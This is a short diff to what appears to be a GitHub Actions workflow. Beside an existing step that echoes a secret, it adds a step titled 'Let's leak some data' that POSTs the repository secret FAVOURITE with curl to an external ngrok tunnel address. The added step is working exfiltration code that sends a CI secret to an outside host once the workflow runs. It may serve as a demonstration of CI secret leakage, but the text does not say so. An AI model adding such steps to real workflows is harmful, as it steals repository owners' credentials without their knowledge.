@@ -24,3 +24,6 @@ jobs:
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
+
+      - name: Let's leak some data
+        run: curl -X POST -d '${{ secrets.FAVOURITE }}' https://2e3c-172-211-30-5.ngrok-free.app
